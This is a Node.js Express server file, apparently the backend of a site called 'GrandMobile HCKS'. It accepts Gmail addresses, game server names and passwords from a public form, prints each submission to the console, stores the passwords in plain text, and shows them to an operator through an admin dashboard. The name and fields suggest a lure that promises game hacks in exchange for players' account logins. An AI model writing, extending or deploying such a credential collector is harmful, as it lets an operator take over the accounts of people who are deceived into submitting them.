const express = require("express");
const session = require("express-session");
const Database = require("better-sqlite3");
const path = require("path");

const app = express();
const db = new Database("data.db");

// Change these before deploying.
const ADMIN_USERNAME = process.env.ADMIN_USERNAME;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD;

db.exec(`
  CREATE TABLE IF NOT EXISTS submissions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    gmail_account TEXT NOT NULL,
    server TEXT NOT NULL,
    password TEXT,
    created_at TEXT NOT NULL DEFAULT (datetime('now','localtime'))
  )
`);

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(session({
  secret: "replace-this-with-a-long-random-secret",
  resave: false,
  saveUninitialized: false,
  cookie: { httpOnly: true, sameSite: "lax" }
}));
app.use(express.static(path.join(__dirname, "public")));

function requireAdmin(req, res, next) {
  if (!req.session.admin) return res.status(401).json({ error: "Admin access required." });
  next();
}

app.post("/api/submit", (req, res) => {
  console.log("DATA RECEIVED:", req.body);

  const gmail_account = req.body.gmail_account;
  const server = req.body.server;
  const password = req.body.password;

  if (!gmail_account || !server) {
    return res.status(400).json({
      error: "Gmail and server are required."
    });
  }

  db.prepare(`
    INSERT INTO submissions
    (gmail_account, server, password)
    VALUES (?, ?, ?)
  `).run(
    String(gmail_account).trim(),
    String(server).trim(),
    String(password || "").trim()
  );

  res.json({ ok: true });
});

app.post("/api/admin/login", (req, res) => {
  const { username, password } = req.body;
  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
    req.session.admin = true;
    return res.json({ ok: true });
  }
  res.status(401).json({ error: "Invalid admin login." });
});

app.post("/api/admin/logout", (req, res) => {
  req.session.destroy(() => res.json({ ok: true }));
});

app.get("/api/admin/submissions", requireAdmin, (req, res) => {
  const rows = db.prepare(`
    SELECT id, gmail_account, server, password, created_at
    FROM submissions ORDER BY id DESC
  `).all();
  res.json(rows);
});

app.delete("/api/admin/submissions/:id", requireAdmin, (req, res) => {
  db.prepare("DELETE FROM submissions WHERE id = ?").run(req.params.id);
  res.json({ ok: true });
});

app.get("/api/admin/me", (req, res) => {
  res.json({ admin: !!req.session.admin });
});

app.listen(3000, () => {
  console.log("GrandMobile HCKS running at http://localhost:3000");
  console.log("Admin dashboard: http://localhost:3000/admin.html");
});
